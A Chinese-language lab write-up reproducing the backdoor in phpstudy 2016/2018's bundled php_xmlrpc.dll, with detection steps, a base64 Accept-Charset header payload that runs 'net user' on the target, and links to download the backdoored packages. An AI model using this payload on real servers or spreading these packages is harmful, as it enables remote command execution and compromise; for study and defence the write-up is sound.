# 0x00 软件介绍
phpstudy：流行的php集成部署环境

# 0x01 复现环境
使用环境：本地搭建的环境  
复现版本：phpstudy 2018

# 0x02 环境搭建
靶机环境：2008_r2_standard_zh-chs

后门代码存在于phpstudy 2016和phpstudy 2018自带的php-5.2.17、php-5.4.45中的\ext\php_xmlrpc.dll模块中，用记事本打开此文件，查找“@eval”，若文件存在“@eval(%s('%s'));”则存在后门，如下图  
![image](./0.png)  
下载并安装phpstudy 2018，按照提示下一步即可

# 0x03 利用条件
无

# 0x04 影响版本
phpstudy 2016和phpstudy 2018自带的php-5.2.17、php-5.4.45

# 0x05 漏洞复现
攻击环境：kali_x64_en-us

burp抓包，请求头中添加字段：Accept-Charset:ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7  
上述字符串是“echo system("net user");”base64编码后的字符串，结果如下图  
![image](./1.png)  
需要注意，发送的数据包头部中：Accept-Enconding:gzio, deflate有一处问题，deflate与前面的逗号之间有一个空格，需要手动删除，不然无法成功执行命令

# 0x06 踩坑记录
无

# 0x07 参考链接
无

# 注意
我当时寻找有漏洞的版本花了好多时间，现将我寻找到有效版本分享给大家，漏洞环境大于25MB，不能上传到github中，使用百度云分享  
phpstudy2016分享，提取码：ybdt，链接：https://pan.baidu.com/s/1-dX55n6xT5hNcBYkxicOBg  
phpstudy2018分享，提取码：ybdt，链接：https://pan.baidu.com/s/1bLX53txLZx4NQAwTsM4BQA
